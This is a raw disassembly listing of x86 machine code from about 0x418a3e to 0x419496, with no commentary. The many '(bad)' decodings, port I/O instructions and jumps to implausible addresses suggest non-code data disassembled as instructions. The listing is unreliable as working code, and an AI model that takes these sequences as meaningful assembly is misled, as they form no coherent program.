  418a3e:	sub    eax,0xb987e914
  418a43:	add    BYTE PTR [eax-0xacd8508],ch
  418a49:	add    al,0x8f
  418a4b:	aas    
  418a4c:	icebp  
  418a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a4e:	retf   
  418a4f:	sub    DWORD PTR [edi+0x3c],edi
  418a52:	pop    ebx
  418a53:	ins    BYTE PTR es:[edi],dx
  418a54:	imul   ebp,DWORD PTR [edi],0xbe28fbe1
  418a5a:	cmp    al,0xf1
  418a5c:	popf   
  418a5d:	xor    esi,DWORD PTR [esi+0x43]
  418a60:	cli    
  418a61:	sti    
  418a62:	jmp    0x1d9e05b1
  418a67:	fidiv  DWORD PTR [ebp-0x7d]
  418a6a:	fsubr  st(6),st
  418a6c:	dec    esi
  418a6d:	out    0x62,al
  418a6f:	pop    edi
  418a70:	fmul   DWORD PTR [ebx-0x25624d14]
  418a76:	js     0x418a1c
  418a78:	imul   edx,DWORD PTR [edi-0x629ae3a6],0x22321135
  418a82:	mov    al,ds:0xcd3e29e4
  418a87:	pushf  
  418a88:	fsub   QWORD PTR [edi-0x26]
  418a8b:	push   esi
  418a8c:	jmp    0x9d0e9118
  418a91:	push   ebx
  418a92:	push   ds
  418a93:	sub    ebx,DWORD PTR [ecx-0x11]
  418a96:	(bad)  
  418a97:	cmp    eax,DWORD PTR ds:0x283b2dc6
  418a9d:	mov    eax,ds:0xd411af12
  418aa2:	cs js  0x418b03
  418aa5:	leave  
  418aa6:	ss enter 0x5ae6,0x9c
  418aab:	in     eax,dx
  418aac:	jnp    0x418af5
  418aae:	dec    ecx
  418aaf:	stc    
  418ab0:	adc    edi,DWORD PTR [ecx-0x57]
  418ab3:	ss out dx,al
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x520941ce
  418b23:	(bad)  
  418b24:	jbe    0x418b1a
  418b26:	push   edx
  418b27:	add    eax,DWORD PTR [ecx]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [esp+eax*4-0x1cb398b2],bh
  418b34:	or     eax,0xbb08d8c4
  418b39:	mov    ah,0xea
  418b3b:	push   ebx
  418b3c:	(bad)  
  418b3d:	xor    eax,0x8e909f88
  418b42:	lds    esi,FWORD PTR [eax-0x57]
  418b45:	push   esp
  418b46:	sub    DWORD PTR [eax+0x1e66b289],edx
  418b4c:	jmp    0xd71651a0
  418b51:	xchg   edi,eax
  418b52:	mov    cl,0x58
  418b54:	test   al,0xef
  418b56:	mov    ebx,0x2c4fb08a
  418b5b:	sbb    ah,BYTE PTR [ebx]
  418b5d:	into   
  418b5e:	ret    
  418b5f:	sti    
  418b60:	std    
  418b61:	imul   ebp,DWORD PTR [edi+esi*8],0xffffffab
  418b65:	sub    DWORD PTR [edx+0x4ae6a162],ecx
  418b6b:	mov    BYTE PTR [esi+0x1e],dh
  418b6e:	pop    esp
  418b6f:	shl    DWORD PTR [esp+esi*1-0x500078b1],1
  418b76:	jno    0x418b61
  418b78:	jmp    FWORD PTR [ebx-0x5c]
  418b7b:	inc    ebp
  418b7c:	or     al,0x3b
  418b7e:	out    dx,al
  418b7f:	mov    ah,0xad
  418b81:	sbb    ah,bh
  418b83:	inc    edx
  418b84:	inc    eax
  418b85:	shl    bl,1
  418b87:	or     al,0xe1
  418b89:	sub    DWORD PTR [ebp-0x5e],0xdf18501
  418b90:	daa    
  418b91:	or     ebp,ebp
  418b93:	inc    esi
  418b94:	mov    DWORD PTR [ebp+ebx*1+0x62],esi
  418b98:	inc    ebx
  418b99:	mov    eax,0x7ed76ff6
  418b9e:	ret    0x23d2
  418ba1:	and    ch,BYTE PTR [esi+0x18837e06]
  418ba7:	mov    bl,0x32
  418ba9:	and    al,0xfb
  418bab:	mov    edi,0xc1f0f6fc
  418bb0:	xchg   ebp,eax
  418bb1:	jle    0x418b93
  418bb3:	sti    
  418bb4:	add    BYTE PTR [ecx],ch
  418bb6:	xchg   esp,eax
  418bb7:	pushf  
  418bb8:	xor    DWORD PTR [ebx-0x821b601],ecx
  418bbe:	popf   
  418bbf:	mov    ecx,0xeccd85fc
  418bc4:	fnstenv [edx]
  418bc6:	arpl   WORD PTR [edi],ax
  418bc8:	cdq    
  418bc9:	cmp    al,0xcb
  418bcb:	scas   eax,DWORD PTR es:[edi]
  418bcc:	dec    eax
  418bcd:	fmulp  st(7),st
  418bcf:	xchg   esi,eax
  418bd0:	xchg   edx,eax
  418bd1:	ret    0x3230
  418bd4:	or     esi,DWORD PTR [ebp+0x6a]
  418bd7:	loopne 0x418c44
  418bd9:	inc    eax
  418bda:	pusha  
  418bdb:	and    edi,DWORD PTR [ebx-0x66eaa486]
  418be1:	add    BYTE PTR [edx],bh
  418be3:	int    0x56
  418be5:	or     BYTE PTR [eax],0xaf
  418be8:	cli    
  418be9:	mov    ebx,0x89197838
  418bee:	shl    BYTE PTR [edx],cl
  418bf0:	push   0x267be8c8
  418bf5:	rcr    BYTE PTR [ebp-0x3d1f204e],0x1b
  418bfc:	sbb    eax,0x8337a1aa
  418c01:	dec    ecx
  418c02:	or     DWORD PTR [esi],esi
  418c04:	sti    
  418c05:	call   0xc990077d
  418c0a:	sti    
  418c0b:	mov    dh,0x7b
  418c0d:	xor    ebp,esi
  418c0f:	out    0xd8,eax
  418c11:	sar    DWORD PTR [ebp+0x30],cl
  418c14:	aas    
  418c15:	bound  esp,QWORD PTR [ebp+edi*1+0x5424928f]
  418c1c:	outs   dx,BYTE PTR ds:[esi]
  418c1d:	outs   dx,BYTE PTR ds:[esi]
  418c1e:	xor    eax,0x269fde63
  418c23:	data16 sbb al,0xe7
  418c26:	(bad)
  418c29:	sbb    BYTE PTR [ecx-0x50],bl
  418c2c:	xchg   ecx,eax
  418c2d:	lds    edi,FWORD PTR [esi-0x4fa9677]
  418c33:	lds    esi,FWORD PTR [ebx+0x0]
	...
  418c96:	sti    
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    ebp,ecx
  418ca3:	fcom   DWORD PTR [ecx]
  418ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca6:	pop    ecx
  418ca7:	add    al,0x1
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [ebx],al
  418caf:	xor    al,0x2e
  418cb1:	dec    ebp
  418cb2:	test   eax,0xee063e9e
  418cb7:	adc    eax,0xbfe42e19
  418cbc:	fistp  QWORD PTR [esi+0x26a9aa1]
  418cc2:	push   0x5b
  418cc4:	sbb    BYTE PTR [ebx+esi*2],dl
  418cc7:	jg     0x418cd6
  418cc9:	push   0xffffff8b
  418ccb:	jae    0x418cd9
  418ccd:	xchg   edx,eax
  418cce:	xlat   BYTE PTR ds:[ebx]
  418ccf:	shl    DWORD PTR [eax-0x9],1
  418cd2:	xchg   DWORD PTR [edx],ebp
  418cd4:	xchg   ebx,eax
  418cd5:	int    0x72
  418cd7:	pop    esi
  418cd8:	fwait
  418cd9:	xchg   edi,eax
  418cda:	push   eax
  418cdb:	xor    eax,0x530032ca
  418ce0:	pop    eax
  418ce1:	mov    ah,0x71
  418ce3:	ret    
  418ce4:	push   0x3d80ccac
  418ce9:	xchg   ebx,ebx
  418ceb:	js     0x418c98
  418ced:	mov    ds:0x2760f313,al
  418cf2:	cmp    eax,0x5b7c6b1f
  418cf7:	xor    al,0x36
  418cf9:	pusha  
  418cfa:	dec    eax
  418cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cfc:	ret    0xf7e4
  418cff:	xor    al,0x4
  418d01:	push   esp
  418d02:	xor    edi,DWORD PTR es:[esi-0x47b824db]
  418d09:	xlat   BYTE PTR ds:[ebx]
  418d0a:	js     0x418d60
  418d0c:	mov    ds:0xb7322b2c,eax
  418d11:	sub    edx,DWORD PTR [ebx+0x17432e5a]
  418d17:	and    BYTE PTR [edi+ebp*4-0x4dd8ffe6],ah
  418d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d1f:	jbe    0x418ca6
  418d21:	xchg   ebx,eax
  418d22:	fadd   QWORD PTR [ebx-0x3b2987de]
  418d28:	mov    ecx,0x8bf41190
  418d2d:	sahf   
  418d2e:	jecxz  0x418d1f
  418d30:	fs xor esi,esi
  418d33:	adc    dh,BYTE PTR [ecx-0x31c4b16c]
  418d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d3a:	xor    eax,0x777120b1
  418d3f:	pop    edx
  418d40:	mov    ebp,0x3253c408
  418d45:	(bad)  
  418d46:	jmp    0x418dc6
  418d48:	iret   
  418d49:	push   dx
  418d4b:	ret    0xac8c
  418d4e:	(bad)  
  418d50:	mov    cl,0x6f
  418d52:	mov    cs,WORD PTR ds:0xd3aaf3ea
  418d58:	shl    eax,cl
  418d5a:	inc    ebx
  418d5b:	inc    edi
  418d5c:	pop    eax
  418d5d:	mov    ecx,0xe8766a3e
  418d62:	iret   
  418d63:	sub    DWORD PTR ds:0x788b23d5,ebx
  418d69:	mov    al,ds:0xc6185885
  418d6e:	xlat   BYTE PTR ds:[ebx]
  418d6f:	scas   eax,DWORD PTR es:[edi]
  418d70:	int    0x8d
  418d72:	test   BYTE PTR gs:[edi-0x20],dh
  418d76:	out    0xf2,eax
  418d78:	and    edx,0x3a4211e1
  418d7e:	(bad)
  418d81:	clc    
  418d82:	cli    
  418d83:	adc    eax,0x416eeedc
  418d88:	adc    al,0xff
  418d8a:	jns    0x418dc8
  418d8c:	sub    al,0x2d
  418d8e:	sar    DWORD PTR [eax-0x6816f36b],cl
  418d94:	sbb    dh,cl
  418d96:	dec    esi
  418d97:	test   al,0x16
  418d99:	div    BYTE PTR [ebx-0x20]
  418d9c:	adc    edi,DWORD PTR [ecx]
  418d9e:	push   ecx
  418d9f:	pop    ds
  418da0:	jp     0x418dc9
  418da2:	add    BYTE PTR [edx-0x34],cl
  418da5:	rep outs dx,DWORD PTR ds:[esi]
  418da7:	hlt    
  418da8:	in     eax,0xb
  418daa:	push   edi
  418dab:	pop    edx
  418dac:	repnz popa 
  418dae:	outs   dx,BYTE PTR ds:[esi]
  418daf:	retf   
  418db0:	push   esi
  418db1:	out    dx,al
  418db2:	stc    
  418db3:	xchg   esi,eax
  418db4:	sbb    al,BYTE PTR [eax]
	...
  418e16:	push   cs
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x9ade5799
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	dec    ebp
  418e2f:	pop    esi
  418e30:	push   ds
  418e31:	jge    0x418ddc
  418e33:	rol    DWORD PTR [eax+0x670bc0e9],0xd
  418e3a:	mov    edx,0x75f935fe
  418e3f:	pusha  
  418e40:	xchg   edx,eax
  418e41:	sahf   
  418e42:	add    al,0xc
  418e44:	cmp    esp,DWORD PTR ds:0x5d6c1073
  418e4a:	xor    BYTE PTR [ebx],ch
  418e4c:	fiadd  WORD PTR [ebp+0x76717764]
  418e52:	outs   dx,DWORD PTR ds:[esi]
  418e53:	inc    edx
  418e54:	mov    ds:0x90cdccb7,eax
  418e59:	adc    al,0xf6
  418e5b:	jo     0x418e00
  418e5d:	popa   
  418e5e:	arpl   WORD PTR [esi],bx
  418e60:	or     eax,ecx
  418e62:	sub    cl,BYTE PTR [esi]
  418e64:	push   0xec775a9
  418e69:	mov    BYTE PTR [ebx-0x3738887],dh
  418e6f:	rcr    BYTE PTR [eax],1
  418e71:	cmp    BYTE PTR [ecx+esi*2+0xcf27df8],cl
  418e78:	push   ebp
  418e79:	outs   dx,DWORD PTR ds:[esi]
  418e7b:	adc    ecx,ecx
  418e7d:	mov    bh,0xcd
  418e7f:	shl    dl,cl
  418e81:	mov    cl,0x62
  418e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e84:	pop    ds
  418e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e86:	xchg   BYTE PTR [ecx-0x7822696e],al
  418e8c:	mov    edi,DWORD PTR [edi+0x53]
  418e8f:	pop    DWORD PTR [ebp-0x4c]
  418e92:	and    al,0x79
  418e94:	(bad)  
  418e95:	scas   eax,DWORD PTR es:[edi]
  418e96:	out    0x11,eax
  418e98:	xor    ebp,esp
  418e9a:	mov    esi,0xc7c40c35
  418e9f:	xchg   BYTE PTR [ecx-0x65],dl
  418ea2:	xchg   edx,eax
  418ea3:	adc    al,0x54
  418ea6:	cmc    
  418ea7:	scas   al,BYTE PTR es:[edi]
  418ea8:	push   esp
  418ea9:	or     al,BYTE PTR [edx]
  418eab:	or     ebx,DWORD PTR [esi+0x306aa182]
  418eb1:	add    al,0x87
  418eb3:	dec    ebx
  418eb4:	sub    al,BYTE PTR [eax+0x227c9d93]
  418eba:	scas   al,BYTE PTR es:[edi]
  418ebb:	add    dl,BYTE PTR [edx+0x68]
  418ebe:	push   ebp
  418ebf:	sub    esi,esp
  418ec1:	cmp    ch,BYTE PTR [edx-0x2d779098]
  418ec7:	jl     0x418e79
  418ec9:	loope  0x418e8d
  418ecb:	icebp  
  418ecc:	pop    es
  418ecd:	out    dx,eax
  418ece:	dec    edi
  418ecf:	sub    ecx,DWORD PTR [esi+edi*8-0x7d]
  418ed3:	sbb    ah,BYTE PTR [ebx+ebp*8]
  418ed6:	(bad)
  418ed9:	cmp    DWORD PTR [ebx-0x7c07ad3b],0xffffffd8
  418ee0:	mov    edx,0x4ace88cf
  418ee5:	sbb    dh,BYTE PTR [esi]
  418ee7:	add    ebp,DWORD PTR [ebp+ebp*2-0x8]
  418eeb:	je     0x418f4f
  418eed:	(bad)  
  418eee:	in     eax,0x15
  418ef0:	int3   
  418ef1:	mov    al,0x86
  418ef3:	and    eax,0x65296d39
  418ef8:	addr16 lahf 
  418efa:	pop    es
  418efb:	pop    esi
  418efc:	lahf   
  418efd:	ss inc edx
  418eff:	xchg   esp,eax
  418f00:	inc    esi
  418f01:	std    
  418f02:	sub    ebx,DWORD PTR [ebx]
  418f04:	outs   dx,BYTE PTR ds:[esi]
  418f05:	test   DWORD PTR [ecx+esi*2-0x47a6bb4f],ebp
  418f0c:	push   es
  418f0d:	in     al,dx
  418f0e:	scas   al,BYTE PTR es:[edi]
  418f0f:	mov    edi,0xd85d4dfe
  418f14:	cmc    
  418f15:	out    dx,eax
  418f16:	and    eax,0xfb50a5fe
  418f1b:	cs cmp eax,0x11bac8c9
  418f21:	dec    ecx
  418f22:	pusha  
  418f23:	add    eax,0xd0f5d486
  418f28:	xchg   ebp,eax
  418f29:	sub    al,0x40
  418f2b:	shl    BYTE PTR [edi+0x3a],1
  418f2e:	mov    ds:0x49c8db9b,al
  418f33:	pushf  
  418f34:	adc    eax,DWORD PTR [eax]
	...
  418f96:	sbb    al,0x97
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp-0x385234e]
  418fa3:	dec    edi
  418fa4:	out    dx,al
  418fa5:	mov    ds:0x10667,al
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [ebx+0x4392685d],bh
  418fb3:	cwde   
  418fb4:	or     al,0x47
  418fb6:	pop    ebx
  418fb7:	pop    esp
  418fb8:	(bad)  
  418fb9:	loope  0x418fd6
  418fbb:	mov    ah,0x66
  418fbd:	or     BYTE PTR [edx-0x14],cl
  418fc0:	inc    ecx
  418fc1:	mov    ebp,0x7578d6cc
  418fc6:	dec    ebx
  418fc7:	icebp  
  418fc8:	sbb    eax,0xb899f4f0
  418fcd:	call   0x82e8002b
  418fd2:	scas   al,BYTE PTR es:[edi]
  418fd3:	shl    DWORD PTR [esi-0x5d14f6a7],cl
  418fd9:	hlt    
  418fda:	das    
  418fdb:	inc    edx
  418fdc:	es (bad) 
  418fde:	cmc    
  418fdf:	xchg   edi,eax
  418fe0:	mov    eax,0x231fc91b
  418fe5:	out    dx,eax
  418fe6:	rcr    DWORD PTR [edi],0x9
  418fe9:	sbb    DWORD PTR [edx],esi
  418feb:	inc    ebp
  418fec:	(bad)  
  418fed:	dec    eax
  418fee:	mov    edi,0xb4fade60
  418ff3:	xchg   edi,eax
  418ff4:	jb     0x418fb1
  418ff6:	sub    edi,DWORD PTR [edx+ecx*1+0x2a25f671]
  418ffd:	or     al,0x32
  418fff:	jmp    0x623da14b
  419004:	clc    
  419005:	arpl   di,di
  419007:	sub    ch,al
  419009:	add    eax,0x8b8571d
  41900e:	inc    ebp
  41900f:	jae    0x419071
  419011:	mov    BYTE PTR [esi],ah
  419013:	in     al,0xbe
  419015:	push   ds
  419016:	(bad)  
  419017:	lea    esi,[ecx+0x6b]
  41901a:	in     al,0x8f
  41901c:	dec    esp
  41901d:	jecxz  0x418fb1
  41901f:	mov    bl,0xd8
  419021:	imul   BYTE PTR [esi+edi*1+0x3f]
  419025:	push   ss
  419026:	inc    ebp
  419027:	pop    esi
  419028:	mov    al,cl
  41902a:	out    dx,eax
  41902b:	mov    ebx,0xe28f6730
  419030:	fadd   DWORD PTR [ebx+0x2b51298e]
  419036:	xor    eax,0x35aedce7
  41903b:	ja     0x419007
  41903d:	enter  0xadf8,0xd5
  419041:	add    DWORD PTR [ecx-0x24c13efc],edi
  419047:	jmp    FWORD PTR [edx-0x38]
  41904a:	adc    cl,BYTE PTR [ebx]
  41904c:	pushf  
  41904d:	ds jo  0x41907c
  419050:	imul   edx,esi,0x5a67eb3a
  419056:	mov    al,0xb7
  419058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419059:	cmp    al,0xca
  41905b:	push   ebx
  41905c:	xchg   edi,eax
  41905d:	ins    DWORD PTR es:[edi],dx
  41905e:	int    0x48
  419060:	sub    al,0x48
  419062:	push   0xfffffff5
  419064:	mov    BYTE PTR [eax],0x81
  419067:	mov    bh,BYTE PTR [ecx+0x67]
  41906a:	adc    ch,BYTE PTR ds:0x44cede0b
  419070:	not    BYTE PTR [ebx]
  419072:	aad    0x42
  419074:	test   DWORD PTR [ebx+0x685a0d8d],0x1f06785b
  41907e:	push   ss
  41907f:	pop    ss
  419080:	inc    eax
  419081:	mov    ah,0x47
  419083:	imul   ecx,DWORD PTR [eax+0x7],0xf64e6276
  41908a:	loopne 0x419023
  41908c:	cli    
  41908d:	cmc    
  41908e:	pusha  
  41908f:	(bad)  
  419090:	lahf   
  419091:	mov    ebx,edx
  419093:	daa    
  419094:	add    al,0xf5
  419096:	xchg   esi,eax
  419097:	push   edi
  419098:	fiadd  DWORD PTR [edx+0x59]
  41909b:	call   0x658e:0x8911f9fd
  4190a2:	sbb    DWORD PTR [ecx+0xb],edi
  4190a5:	outs   dx,DWORD PTR ds:[esi]
  4190a6:	retf   
  4190a7:	bound  ebx,QWORD PTR [ebx+0x2]
  4190aa:	pop    ss
  4190ab:	sti    
  4190ac:	inc    ebp
  4190ad:	xchg   ecx,edx
  4190af:	cwde   
  4190b0:	iret   
  4190b1:	jecxz  0x4190ec
  4190b3:	jno    0x419118
	...
  419115:	add    BYTE PTR [edi-0x41bd617b],ch
  41911b:	pop    ebx
  41911c:	(bad)  
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    edx,DWORD PTR [ecx-0x48]
  419124:	inc    esp
  419125:	out    0x6e,al
  419127:	pop    es
  419128:	add    DWORD PTR [eax],eax
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    BYTE PTR [esi],bl
  41912f:	(bad)  
  419130:	jne    0x41914c
  419132:	mov    edx,0xaeb1f465
  419137:	mov    ch,0xa
  419139:	push   edx
  41913a:	out    dx,eax
  41913b:	jae    0x4190fd
  41913d:	mov    DWORD PTR [eax+0x7d],esp
  419140:	pusha  
  419141:	dec    esp
  419142:	sbb    eax,0xafd16193
  419147:	mov    ds:0x5508e6a2,al
  41914c:	xlat   BYTE PTR ds:[ebx]
  41914d:	sahf   
  41914e:	sub    ebx,DWORD PTR [edx+ebp*1-0x1f12121b]
  419155:	iret   
  419156:	mov    dh,0x8e
  419158:	xor    edi,DWORD PTR [edx]
  41915a:	cs in  al,0xc4
  41915d:	enter  0xd0e6,0xdd
  419161:	jb     0x41916f
  419163:	push   ss
  419164:	and    BYTE PTR [esp+esi*8+0x565dd848],al
  41916b:	mov    ebx,0x612cd151
  419170:	loope  0x419134
  419172:	sbb    edi,ebp
  419174:	lds    eax,FWORD PTR [ecx]
  419176:	mov    ds:0x1abc2830,eax
  41917b:	dec    edi
  41917c:	imul   ebp,DWORD PTR ds:0x2532603,0x26
  419183:	xchg   ecx,eax
  419184:	dec    edx
  419185:	inc    edx
  419186:	xchg   esi,eax
  419187:	fidiv  DWORD PTR ss:[ebp-0x40b97005]
  41918e:	popa   
  41918f:	and    DWORD PTR [esi+0xd40a0df],ebx
  419195:	or     BYTE PTR [ebx+ebp*1+0x51],dl
  419199:	outs   dx,BYTE PTR ds:[esi]
  41919a:	adc    ebx,DWORD PTR [edx+eiz*2+0x6a13f504]
  4191a1:	inc    edx
  4191a2:	jge    0x419173
  4191a4:	leave  
  4191a5:	in     al,dx
  4191a6:	sbb    DWORD PTR [edi],0xcaa92b16
  4191ac:	es psubw mm0,mm3
  4191b0:	arpl   WORD PTR [edx],ax
  4191b2:	ds je  0x41913c
  4191b5:	sti    
  4191b6:	xchg   BYTE PTR [edx+ebx*4-0x5c],ah
  4191ba:	sub    eax,ebx
  4191bc:	jle    0x4191d6
  4191be:	shl    DWORD PTR [edi+0x610411b6],0xf
  4191c5:	fld    TBYTE PTR [edi-0x77]
  4191c8:	cmp    BYTE PTR [esi-0x36],bl
  4191cb:	mov    dh,0x4c
  4191cd:	adc    eax,0xeb548b92
  4191d2:	ins    BYTE PTR es:[edi],dx
  4191d3:	dec    eax
  4191d4:	mov    edx,DWORD PTR [ebp-0x4a5f36c2]
  4191da:	mov    esp,0xf67d7a31
  4191df:	fdiv   st(0),st
  4191e1:	or     BYTE PTR [eax],al
  4191e3:	add    dl,ch
  4191e5:	dec    ebp
  4191e6:	aas    
  4191e7:	inc    esi
  4191e8:	add    ebx,edx
  4191ea:	jge    0x419204
  4191ec:	imul   esi,DWORD PTR [edx],0x3d46a232
  4191f2:	jg     0x419188
  4191f4:	loopne 0x4191db
  4191f6:	ja     0x419210
  4191f8:	sbb    BYTE PTR [edi],0xf1
  4191fb:	mov    al,0xe5
  4191fd:	jmp    0x4191d0
  4191ff:	mov    dh,0xa9
  419201:	inc    esp
  419202:	xlat   BYTE PTR ds:[ebx]
  419203:	(bad)  
  419204:	inc    ebp
  419205:	cwde   
  419206:	mov    ?,WORD PTR [esi-0x11f7c1cb]
  41920c:	sbb    eax,0xd9b3c956
  419211:	rol    BYTE PTR [ecx+0x13040912],1
  419217:	fs out 0x45,al
  41921a:	addr16 hlt 
  41921c:	or     eax,DWORD PTR [ebx+0x18]
  41921f:	cmp    BYTE PTR [edx+edx*4],dh
  419222:	test   DWORD PTR [esi+ecx*1-0x35],ecx
  419226:	ds xchg dh,cl
  419229:	jo     0x4191f3
  41922b:	enter  0x26cc,0x71
  41922f:	jnp    0x419291
  419231:	es push edx
  419233:	and    ah,ch
	...
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x7e16a94f
  4192a5:	(bad)  
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [edi+eiz*1+0x3e5195fa],al
  4192b4:	adc    DWORD PTR [esp+ecx*2-0x6fd3f324],eax
  4192bb:	pop    ss
  4192bc:	sbb    dl,BYTE PTR [edi+0x141026cf]
  4192c2:	loope  0x4192d5
  4192c4:	inc    ebp
  4192c5:	adc    eax,0x8bc95d57
  4192ca:	adc    al,0x6d
  4192cc:	push   cs
  4192cd:	shl    DWORD PTR [esi],cl
  4192cf:	xchg   edx,eax
  4192d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192d1:	bound  edi,QWORD PTR [edx-0x5d195058]
  4192d7:	fist   DWORD PTR [ebx]
  4192d9:	mov    bl,0x69
  4192db:	das    
  4192dc:	clc    
  4192dd:	mov    ecx,edx
  4192df:	add    eax,0xafb59f04
  4192e4:	or     ebx,ecx
  4192e6:	add    eax,0x929ed034
  4192eb:	xor    dl,BYTE PTR [esi-0x47a3b729]
  4192f1:	int3   
  4192f2:	fist   WORD PTR [ebx+0x3447a0ae]
  4192f8:	test   al,0xca
  4192fa:	add    edx,DWORD PTR [edi-0x66]
  4192fd:	cld    
  4192fe:	and    esp,eax
  419300:	in     eax,dx
  419301:	outs   dx,BYTE PTR ds:[esi]
  419302:	shl    DWORD PTR [edx+ebp*8],0x53
  419306:	mov    ebx,edi
  419308:	mov    ebp,0x3aca4030
  41930d:	mov    esi,0xb2c20e1c
  419312:	push   cs
  419313:	jno    0x41930a
  419315:	fmul   QWORD PTR [ebx-0x76e8bfd6]
  41931b:	in     eax,dx
  41931c:	mov    bl,0x31
  41931e:	daa    
  41931f:	push   edi
  419320:	in     eax,0x24
  419322:	push   esp
  419323:	inc    esi
  419324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419325:	jecxz  0x4193a6
  419327:	jnp    0x4192c6
  419329:	cdq    
  41932a:	mov    dh,0x22
  41932c:	in     al,0x6c
  41932e:	pop    edx
  41932f:	pop    esp
  419330:	or     al,0x43
  419332:	pop    es
  419333:	mov    ebx,0xbe114c4e
  419338:	(bad)  
  419339:	and    al,0xf5
  41933b:	push   eax
  41933c:	cmp    ebx,eax
  41933e:	ins    BYTE PTR es:[edi],dx
  41933f:	out    dx,al
  419340:	imul   edi,DWORD PTR fs:[eax+0x5a],0x5b
  419345:	jae    0x419384
  419347:	add    eax,0xaae30002
  41934c:	test   eax,0xa3d857f1
  419351:	in     al,dx
  419352:	(bad)  [edi]
  419354:	xchg   esi,eax
  419355:	scas   al,BYTE PTR es:[edi]
  419356:	cmp    eax,0xdfb3c2bc
  41935b:	mov    ebp,0x48080e53
  419360:	xor    DWORD PTR [esi+0x74453966],0x40
  419367:	push   0xebe2ba38
  41936c:	ja     0x4193c2
  41936e:	ror    cl,0xa3
  419371:	ds das 
  419373:	push   0xc5f0e9a5
  419378:	cmp    BYTE PTR [edx-0x3],dl
  41937b:	loopne 0x4193c9
  41937d:	lods   al,BYTE PTR ds:[esi]
  41937e:	addr16 jg 0x4193e7
  419381:	es push ds
  419383:	mov    esp,0x9479414d
  419388:	cmp    BYTE PTR [edi+0x5],ah
  41938b:	(bad)  
  41938c:	out    0x70,eax
  41938e:	sbb    esi,DWORD PTR [ebx+0x5557a61c]
  419394:	xchg   edx,eax
  419395:	or     eax,0x198b0a1c
  41939a:	or     BYTE PTR [eax+0x774c9e85],bh
  4193a0:	clc    
  4193a1:	mov    ss,WORD PTR [ebp-0x5b24f0c3]
  4193a7:	or     DWORD PTR [bp+0x25d6],ecx
  4193ac:	sub    al,0x6e
  4193ae:	and    eax,0xc0ce6196
  4193b3:	inc    ebp
  4193b4:	enter  0x0,0x0
	...
  419414:	add    BYTE PTR [eax],al
  419416:	cmp    eax,0xed3a6998
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8+0x624ad137]
  419425:	(bad)  
  419427:	or     DWORD PTR [ecx],eax
  419429:	add    BYTE PTR [edi],al
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    ah,cl
  41942f:	pop    ebp
  419430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419431:	or     BYTE PTR [ebp-0x72],ah
  419434:	cli    
  419435:	(bad)  
  419436:	call   0x63347ca2
  41943b:	ja     0x4193dd
  41943d:	(bad)  
  41943e:	out    dx,eax
  41943f:	(bad)  
  419440:	clc    
  419441:	das    
  419442:	std    
  419443:	add    al,0x84
  419445:	jnp    0x4194bc
  419447:	dec    edi
  419448:	mov    bh,0xd
  41944a:	cwde   
  41944b:	out    dx,al
  41944c:	mov    al,0xaf
  41944e:	sbb    eax,0xe6b132e0
  419453:	mov    DWORD PTR [ebx],ebp
  419455:	arpl   si,di
  419457:	stos   DWORD PTR es:[edi],eax
  419458:	adc    BYTE PTR ds:0x4fe0381a,ah
  41945e:	jle    0x419465
  419460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419461:	and    DWORD PTR [esi+0x23],0x49
  419465:	jmp    0x4b59333
  41946a:	clc    
  41946b:	xchg   esi,eax
  41946c:	and    al,0x0
  41946e:	pop    ebp
  41946f:	and    edi,DWORD PTR [edx-0x5d8fcef9]
  419475:	in     eax,dx
  419476:	cmp    edx,DWORD PTR [edi+0x7c]
  419479:	cwde   
  41947a:	push   es
  41947b:	cmp    esi,DWORD PTR [esi]
  41947d:	loope  0x4194ab
  41947f:	push   edx
  419480:	jns    0x4194f8
  419482:	adc    bh,BYTE PTR [edx]
  419484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419485:	(bad)  
  419486:	call   0x38ab9c42
  41948b:	test   eax,0x42876133
  419490:	mov    ds:0x4e19af8b,al
  419495:	dec    ecx
  419496:	call   DWORD PTR [eax+0x3f]
